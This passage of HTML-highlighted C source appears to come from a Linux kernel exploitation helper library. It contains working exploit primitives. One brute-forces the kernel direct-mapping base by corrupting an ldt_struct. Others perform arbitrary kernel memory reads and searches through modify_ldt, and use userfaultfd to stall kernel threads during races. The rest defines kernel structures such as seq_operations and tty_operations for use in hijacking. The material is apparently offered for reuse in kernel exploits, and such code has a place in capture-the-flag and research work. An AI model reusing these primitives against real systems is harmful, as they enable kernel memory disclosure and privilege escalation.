class="function"></span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - ldt_struct related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Somethings we may want to compile the exp binary with MUSL-GCC, which</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t contain the `asm/ldt.h` file.</span></span><br><span class="line"><span class="comment"> * As the file is small, I copy that directly to here :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ASSEMBLY__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_DATA	0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_STACK	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_CODE	2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__ASSEMBLY__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* this should be referred to your kernel */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* desc initializer */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">init_desc</span><span class="params">(struct user_desc *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    desc-&gt;base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc-&gt;entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc-&gt;limit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;contents = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;lm = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;useable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief burte-force hitting page_offset_base by modifying ldt_struct</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_cracker function to make the ldt_struct modifiable</span></span><br><span class="line"><span class="comment"> * @param cracker_args args of ldt_cracker</span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param burte_size size of each burte-force hitting</span></span><br><span class="line"><span class="comment"> * @return size_t address of page_offset_base</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="keyword">void</span> *(*ldt_cracker)(<span class="keyword">void</span>*),</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *cracker_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *momdifier_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">uint64_t</span> burte_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] no mm-&gt;context.ldt!&quot;</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief read the contents from a specific kernel memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param addr address of kernel memory to read</span></span><br><span class="line"><span class="comment"> * @param res_buf buf to be written the data from kernel memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ldt_arbitrary_read</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *res_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, <span class="number">0x8000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief seek specific content in the memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param page_offset_base the page_offset_base we leakked before</span></span><br><span class="line"><span class="comment"> * @param mem_finder your own function to search on a 0x8000-bytes buf.</span></span><br><span class="line"><span class="comment"> *          It should be like `size_t func(void *args, char *buf)` and the `buf`</span></span><br><span class="line"><span class="comment"> *          is where we store the data from kernel in ldt_seeking_memory().</span></span><br><span class="line"><span class="comment"> *          The return val should be the offset of the `buf`, `-1` for failure</span></span><br><span class="line"><span class="comment"> * @param finder_args your own function&#x27;s args</span></span><br><span class="line"><span class="comment"> * @return size_t kernel addr of content to find, -1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_seeking_memory</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">uint64_t</span> page_offset_base,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">size_t</span> (*mem_finder)(<span class="keyword">void</span>*, <span class="keyword">char</span> *), <span class="keyword">void</span> *finder_args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> search_addr, result_addr = <span class="number">-1</span>, offset;</span><br><span class="line"></span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line"></span><br><span class="line">        offset = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            result_addr = search_addr + offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VIII - userfaultfd related code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `userfaultfd.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_API ((uint64_t)0xAA)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_REGISTER		(0x00)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_COPY			(0x03)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_API			(0x3F)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* userfaultfd ioctl ids */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO 0xAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API		_IOWR(UFFDIO, _UFFDIO_API,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_api)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER		_IOWR(UFFDIO, _UFFDIO_REGISTER, \</span></span><br><span class="line"><span class="meta">				      struct uffdio_register)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY		_IOWR(UFFDIO, _UFFDIO_COPY,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_copy)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read() structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint8_t</span>	event;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>	reserved1;</span><br><span class="line">	<span class="keyword">uint16_t</span>	reserved2;</span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved3;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	flags;</span><br><span class="line">			<span class="keyword">uint64_t</span>	address;</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="keyword">uint32_t</span> ptid;</span><br><span class="line">			&#125; feat;</span><br><span class="line">		&#125; pagefault;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span>	ufd;</span><br><span class="line">		&#125; fork;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	from;</span><br><span class="line">			<span class="keyword">uint64_t</span>	to;</span><br><span class="line">			<span class="keyword">uint64_t</span>	len;</span><br><span class="line">		&#125; remap;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	start;</span><br><span class="line">			<span class="keyword">uint64_t</span>	end;</span><br><span class="line">		&#125; remove;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* unused reserved fields */</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved1;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved2;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved3;</span><br><span class="line">		&#125; reserved;</span><br><span class="line">	&#125; arg;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_EVENT_PAGEFAULT	0x12</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> api;</span><br><span class="line">    <span class="keyword">uint64_t</span> features;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> start;</span><br><span class="line">    <span class="keyword">uint64_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> <span class="title">range</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING	((uint64_t)1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_WP		((uint64_t)1&lt;&lt;1)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mode;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> dst;</span><br><span class="line">	<span class="keyword">uint64_t</span> src;</span><br><span class="line">	<span class="keyword">uint64_t</span> len;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE		((uint64_t)1&lt;&lt;0)</span></span><br><span class="line">	<span class="keyword">uint64_t</span> mode;</span><br><span class="line">	<span class="keyword">int64_t</span> copy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> temp_page_for_stuck[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, <span class="keyword">void</span> *addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *(*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = pthread_create(monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">uffd_handler_for_stucking_thread</span><span class="params">(<span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* just stuck there is okay... */</span></span><br><span class="line">        sleep(<span class="number">100000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) temp_page_for_stuck;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                                    ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd_for_thread_stucking</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, </span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    register_userfaultfd(monitor_thread, buf, len, </span><br><span class="line">                         uffd_handler_for_stucking_thread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IX - kernel structures </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">size_t</span> from;</span><br><span class="line">	<span class="keyword">size_t</span> count;</span><br><span class="line">	<span class="keyword">size_t</span> pad_until;</span><br><span class="line">	<span class="keyword">loff_t</span> index;</span><br><span class="line">	<span class="keyword">loff_t</span> read_pos;</span><br><span class="line">	<span class="keyword">uint64_t</span> lock[<span class="number">4</span>]; <span class="comment">//struct mutex lock;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">	<span class="keyword">int</span> poll_event;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span 